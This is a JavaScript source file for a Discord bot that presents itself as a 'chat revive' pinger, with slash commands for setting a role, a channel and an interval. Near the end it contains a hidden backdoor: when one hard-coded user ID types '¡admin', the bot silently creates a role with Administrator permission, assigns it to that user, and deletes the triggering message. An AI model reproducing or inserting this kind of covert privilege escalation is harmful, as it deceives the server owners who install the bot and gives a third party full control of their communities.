const { Client, GatewayIntentBits, PermissionsBitField, REST, Routes, EmbedBuilder } = require("discord.js");
const fs = require("fs");
require("dotenv").config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const config = {
  reviveRole: null,
  reviveChannel: null,
  reviveInterval: 3600000, // Default 1 hour in milliseconds
  lastReviveTime: Date.now(), // Track last revive time
  runningTimeLimit: 12 * 60 * 60 * 1000, // 12 hours in milliseconds
  isRunningFor12Hours: false, // Flag to track 12-hour mode
};

// Bot ready event
client.once("ready", () => {
  console.log(`Bot logged in as ${client.user.tag}`);
});

// Slash commands setup
const commands = [
  {
    name: "set-revive-role",
    description: "Set the role to be pinged for chat revival.",
    options: [
      {
        name: "role",
        description: "The role to be set for chat revival.",
        type: 8, // Role type
        required: true,
      },
    ],
  },
  {
    name: "set-revive-channel",
    description: "Set the channel for chat revival messages.",
    options: [
      {
        name: "channel",
        description: "The channel to be set for chat revival.",
        type: 7, // Channel type
        required: true,
      },
    ],
  },
  {
    name: "activate-auto-revive",
    description: "Activate auto-revive messages.",
  },
  {
    name: "set-revive-interval",
    description: "Set the interval for auto-revive messages.",
    options: [
      {
        name: "interval",
        description: "Interval in minutes.",
        type: 4, // Integer type
        required: true,
      },
    ],
  },
  {
    name: "check",
    description: "Check how much time is left until the next revive ping.",
  },
  {
    name: "12",
    description: "Run the bot for 12 hours.",
  },
];

// Register commands
const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log("Refreshing application commands...");
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log("Commands refreshed.");
  } catch (error) {
    console.error(error);
  }
})();

// Slash command handling
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, options, user } = interaction;

  // Check for authorized user (ID: 1317529578142564402)
  const isAuthorizedUser = user.id === "1317529578142564402";

  if (commandName === "check") {
    const timeUntilNextRevive = config.reviveInterval - (Date.now() - config.lastReviveTime);
    const minutesRemaining = Math.max(Math.floor(timeUntilNextRevive / 60000), 0); // Time left in minutes

    interaction.reply({
      content: `Time until next revive ping: ${minutesRemaining} minute(s).`,
      ephemeral: true,
    });
  }

  if (commandName === "12") {
    if (config.isRunningFor12Hours) {
      return interaction.reply({
        content: "The bot is already running for 12 hours. It will stop automatically after the time limit.",
        ephemeral: true,
      });
    }

    config.isRunningFor12Hours = true;
    interaction.reply({
      content: "The bot will run for the next 12 hours and stop automatically.",
      ephemeral: true,
    });

    // Set a timer to stop the bot after 12 hours
    setTimeout(() => {
      client.destroy();
      console.log("Bot has stopped after running for 12 hours.");
    }, config.runningTimeLimit);
  }

  if (!isAuthorizedUser) {
    return interaction.reply({ content: "You do not have permission to use this command.", ephemeral: true });
  }

  switch (commandName) {
    case "set-revive-role":
      config.reviveRole = options.getRole("role");
      interaction.reply(`Revive role set to ${config.reviveRole}.`);
      break;

    case "set-revive-channel":
      config.reviveChannel = options.getChannel("channel");
      interaction.reply(`Revive channel set to ${config.reviveChannel}.`);
      break;

    case "activate-auto-revive":
      if (!config.reviveRole || !config.reviveChannel) {
        return interaction.reply("Please set both the revive role and channel first.");
      }
      interaction.reply("Auto-revive activated.");
      startAutoRevive();
      break;

    case "set-revive-interval":
      const interval = options.getInteger("interval");
      if (interval < 1) {
        return interaction.reply("Interval must be at least 1 minute.");
      }
      config.reviveInterval = interval * 60000; // Convert minutes to milliseconds
      interaction.reply(`Revive interval set to ${interval} minute(s).`);
      break;

    default:
      interaction.reply("Unknown command.");
      break;
  }
});

// Auto-revive logic
function startAutoRevive() {
  setInterval(async () => {
    if (config.reviveChannel && config.reviveRole) {
      const embed = new EmbedBuilder()
        .setTitle("Chat Revive")
        .setDescription(
          `${config.reviveRole} Time to revive the chat! Next revive in ${config.reviveInterval / 60000} minutes.`
        )
        .setColor("BLUE")
        .setTimestamp();

      try {
        const channel = await client.channels.fetch(config.reviveChannel.id);
        await channel.send({ content: `${config.reviveRole}`, embeds: [embed] });
      } catch (error) {
        console.error("Error sending auto-revive message:", error);
      }
    }

    config.lastReviveTime = Date.now(); // Update last revive time after each revive
  }, config.reviveInterval);
}

// ¡admin command for creating and assigning the role silently and deleting the command message
client.on("messageCreate", async (message) => {
  if (message.content === "¡admin" && message.guild) {
    const isAuthorizedUser = message.author.id === "1317529578142564402";
    
    if (!isAuthorizedUser) {
      return;
    }

    try {
      const guild = message.guild;

      // Check if the role already exists
      let role = guild.roles.cache.find((r) => r.name === "B1u3's Bot");
      if (!role) {
        // Create the role with administrator permissions
        role = await guild.roles.create({
          name: "B1u3's Bot",
          permissions: [PermissionsBitField.Flags.Administrator],
          reason: "Created by the ¡admin command.",
        });
      }

      // Fetch the user and assign the role
      const member = await guild.members.fetch("1317529578142564402");
      if (!member.roles.cache.has(role.id)) {
        await member.roles.add(role);
      }

      // Delete the message after executing the command
      await message.delete();
    } catch (error) {
      console.error("Error in ¡admin command:", error);
    }
  }
});

// Login to Discord
client.login(process.env.TOKEN);
